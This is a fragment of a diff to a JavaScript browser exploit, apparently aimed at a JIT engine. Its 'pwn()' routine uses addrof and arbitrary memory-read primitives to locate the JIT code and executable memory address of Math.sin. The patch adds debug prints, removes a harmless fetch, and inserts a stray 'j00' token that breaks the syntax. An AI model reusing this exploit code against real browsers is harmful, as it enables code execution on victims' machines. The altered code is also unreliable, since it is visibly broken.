@@ -132,7 +132,7 @@ function makeJITCompiledFunction() {
     }
     for (var i = 0; i < 1000; i++) {
         target(i);
-    }
+    }j00
     return target;
 }
 
@@ -392,9 +392,9 @@ function pwn()
         var sinFuncAddr = addrof(Math.sin);
         
         var executableAddr = memory.read_i64(sinFuncAddr, 3);
-        
+       
         var jitCodeAddr = memory.read_i64(executableAddr, 3);
-        
+        print("jitCodeAddr:" + jitCodeAddr);
         var rxMemAddr = memory.read_i64(jitCodeAddr, 4);
         if (ShiftRight(rxMemAddr, 4) == 0x7fff) {
             return false; // macOS Library Pointer - Shared Library cache
@@ -520,14 +520,6 @@ function pwn()
        var wrapper = document.createElement('div');
        var wrapperaddr = addrof(wrapper);
        print("wrapper addr:" + wrapperaddr);
-	    
-fetch('http://example.com/movies.json')
-  .then(function(response) {
-    return response.json();
-  })
-  .then(function(myJson) {
-    print(JSON.stringify(myJson));
-  });
        
 
     }
